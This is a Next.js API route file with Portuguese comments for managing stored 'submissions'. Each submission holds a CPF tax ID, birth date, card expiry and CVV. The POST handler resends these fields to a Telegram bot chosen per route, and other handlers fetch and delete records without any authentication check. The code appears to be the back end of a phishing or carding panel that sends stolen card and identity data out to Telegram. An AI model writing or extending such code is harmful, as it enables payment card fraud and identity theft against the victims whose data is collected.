import { NextResponse } from 'next/server'
import { prisma } from '@/lib/prisma'
import { sendToTelegram } from '@/lib/telegram'

// GET - Buscar submission específica
export async function GET(
  request: Request,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params
    
    const submission = await prisma.submission.findUnique({
      where: { id },
      include: {
        routeConfig: {
          select: { name: true, slug: true }
        }
      }
    })

    if (!submission) {
      return NextResponse.json(
        { error: 'Solicitação não encontrada' },
        { status: 404 }
      )
    }

    return NextResponse.json(submission)
  } catch (error) {
    console.error('Error fetching submission:', error)
    return NextResponse.json(
      { error: 'Erro ao buscar solicitação' },
      { status: 500 }
    )
  }
}

// POST - Reenviar para Telegram
export async function POST(
  request: Request,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params
    
    const submission = await prisma.submission.findUnique({
      where: { id },
      include: { routeConfig: true }
    })

    if (!submission) {
      return NextResponse.json(
        { error: 'Solicitação não encontrada' },
        { status: 404 }
      )
    }

    // Reenviar para Telegram
    const telegramResult = await sendToTelegram(
      submission.routeConfig.telegramToken,
      submission.routeConfig.telegramChatId,
      {
        routeName: submission.routeConfig.name,
        cpf: submission.cpf,
        birthDate: submission.birthDate || undefined,
        cardExpiry: submission.cardExpiry || undefined,
        cvv: submission.cvv || undefined,
        timestamp: submission.createdAt.toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }),
      }
    )

    // Atualizar status
    await prisma.submission.update({
      where: { id },
      data: {
        sentToTelegram: telegramResult.success,
        telegramError: telegramResult.error || null,
      }
    })

    return NextResponse.json({
      success: telegramResult.success,
      error: telegramResult.error,
    })
  } catch (error) {
    console.error('Error resending to telegram:', error)
    return NextResponse.json(
      { error: 'Erro ao reenviar para Telegram' },
      { status: 500 }
    )
  }
}

// DELETE - Remover submission
export async function DELETE(
  request: Request,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params
    
    await prisma.submission.delete({
      where: { id }
    })

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error('Error deleting submission:', error)
    return NextResponse.json(
      { error: 'Erro ao deletar solicitação' },
      { status: 500 }
    )
  }
}
